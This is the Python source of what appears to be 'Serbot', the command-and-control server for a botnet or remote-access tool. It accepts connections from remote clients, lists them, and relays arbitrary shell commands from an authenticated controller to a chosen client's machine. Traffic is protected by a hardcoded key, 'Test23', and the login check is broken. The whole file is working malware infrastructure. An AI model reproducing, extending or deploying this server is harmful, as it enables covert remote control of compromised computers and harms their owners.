#!/usr/bin/env python
# -*- coding: utf-8 -*-

import json
import os
from socket import *
import sys
import time

from api import *
from database import *
from encryption import *

if (len(sys.argv) == 4):
	port = int(sys.argv[1])
	bridgeport = int(sys.argv[2])
	password = sys.argv[3]
else:
	sys.exit("Usage: server.py <port> <bridge port> <password>")

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|

"""
_API_VERSION = 'v0.1'

s=socket(AF_INET, SOCK_STREAM)
s.settimeout(5) #5 seconds are given for every operation by socket `s`
s.bind(("0.0.0.0",port))
s.listen(5)

bridge=socket(AF_INET, SOCK_STREAM)
bridge.bind(("0.0.0.0",bridgeport))
bridge.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

allConnections = []
allAddresses = []

#Close all Connections
def quitClients():
	for item in allConnections:
		try:
			item.send("exit")
			item.close()
		except: #Connection already closed
			pass

	del allConnections[:]
	del allAddresses[:]	
	update = 'UPDATE clients SET active="0";'
	db = Database().query(update)
    
def jsonDecode(string, value):
    parsed_json = json.loads(string)
    result = (parsed_json[value])
    return str(result)
    

## Get Client Connections
def getConnections():
    while True:
		try:
			q,addr=s.accept()                     #Lasts 5 seconds and then Exception is raised
			q.setblocking(1)                      #Every new socket has no timeout; every operation takes its time.
			allConnections.append(q)              #Holding our New Connections/Sockets
			allAddresses.append(addr)
			Insert = 'INSERT INTO clients (id, ip_address, active) VALUES ("1", "{address}", "1");'.format(address=str(addr[0]))
			#db = Database().query(Insert)
			print " [+] {address} Inserted to Database".format(address=addr[0])
		except:
			break
            
    ## Message Gramma
    if len(allAddresses) == 1:
		client = "Client"
    else:
		client = "Clients"
        
    body = {"status":"OK", "command":"accept", "reply": "{clientNumber} {cli} Added".format(clientNumber=str(len(allAddresses)), cli=client), "error": "null"}
    reply = Encode().process(body)
    return reply



## Sending to Controller
def sendController(msg, q):
	try:
		q.send(msg)
		return 1 #success
	except: return 0 #fail

## User Login Verification
def verifyUser(credentials):
	Passwd = jsonDecode(credentials, "password")
	if (Passwd == password):
		return True  
	else: return False
        
def listClients():
    clientList = []
    d = {}
    length = len(allAddresses)
    try:
		if (length >= 1):
			for item in allAddresses:
				d['ip']=str(item[0])
				clientList.append(d)
			jsonList = Encode().process(clientList)
			reply = {"status":"OK", "command":"list", "total": str(length), "clients": clientList, "error": "null"}
		else: 
			reply = {"status":"OK", "command":"list", "total": "0", "clients": "null", "error": "null"}
			
		return reply
    except Exception as e:
		print " [!] {error}".format(error = e)

def interact(id, timeout, q):
		try:
			allConnections[id].send("hellows123")
			vtpath = allConnections[id].recv(20480) + "> "
			print " [+] Current Directory: {dir}".format(dir=vtpath)
			
			while True:
				if (time.time() > timeout):
					breakit = True
					break
				else: pass
				
				try:
					data=q.recv(20480)
					command = jsonDecode(data, "command")
				except:
					breakit = True
					break
					
				try:
					#if ("cd " in command):
					#	allConnections[id].send(data)
					#	msg=allConnections[id].recv(20480)
					#	vtpath = msg + "> "
					#	print "PATH: " + str(vtpath)
					#	if (sendController(vtpath, q) == 0):
					#		breakit = True
					#		break
					if (command == "stop"): 
						closed = {"status":"OK", "command":"interact", "reply": "Connection Closed", "error": "null"}
						sendController(closed, q)
						break
					else:
						allConnections[id].send(command)
						msg=allConnections[id].recv(20480)
						body = {"status":"OK", "command":"interact", "reply": msg, "error": "null"}
						reply = Encode().process(body)
						if (sendController(reply, q) == 0):
							breakit = True
							break
				except:
					if (sendController("[SERVER - ERROR] Client closed the connection\n[INFO] Retreiving connections again...\n", q) == 0):
						breakit = True
						break
					break
		except Exception as e:
			print " [!] {error}".format(error=e)
    
def main():
	while True:
		bridge.listen(0)
		q,addr=bridge.accept()
		cpass = q.recv(20480)
		Cpass = encryption().decrypt(cpass, "Test23")
		verifyUser(Cpass)

		timeout = time.time() + 500
		breakit = False
        
		while True:
			if (verifyUser == False): break
			else: pass

			if ((time.time() > timeout) or (breakit == True)): break
			else: pass

			try: 
				message = q.recv(20480)
				Message = encryption().decrypt(message, "Test23")
				command = jsonDecode(Message, "command")
				print " [+] Recieved Command: {CMD}".format(CMD=command)
			except: break
            
			if (command == "accept"):
				clients = getConnections()
				clients = encryption().encrypt(clients, "Test23")
				if (sendController(clients, q) == 0): break

			elif(command == "list"):
				clientList = listClients()
				clientList = encryption().encrypt(clientList, "Test23")
				sendController(clientList, q)

			elif(command == "interact"):
				client = jsonDecode(message, "client")
				if ((int(client) <= len(allAddresses)) and (int(client) >= 0 )):
					body = {"status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
					reply = Encode().process(body)
					reply = encryption().encrypt(reply, "Test23")
					sendController(reply, q)
					inter = interact(int(client), timeout, q)
				else:
					body = {"status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
					reply = Encode().process(body)
					reply = encryption().encrypt(reply, "Test23")
					sendController(reply, q)

			#elif (command == "selfupdateall"):
			#	for item in allConnections:
			#		try:
			#			item.send(command)
			#		except:
			#			pass
			elif(command == "quitClients"):
				quitClients()
				
			elif(command == "quit"):
				sendController(" [-] Goodbye", q)
				q.close()
				break
			else:
				body = {"status":"ERROR", "command":"unknown",
					"reply": "I'm Affraid I Can't Let You Do That Dave",
					 "error": "ID Out Of Range"}
				reply = Encode().process(body)
				reply = encryption().encrypt(reply, "Test23")
				if (sendController(reply, q) == 0): break
				else:pass

while True:
	try:		
		main()
	except KeyboardInterrupt:
		quitClients()
	except:
		quitClients()

	time.sleep(5)
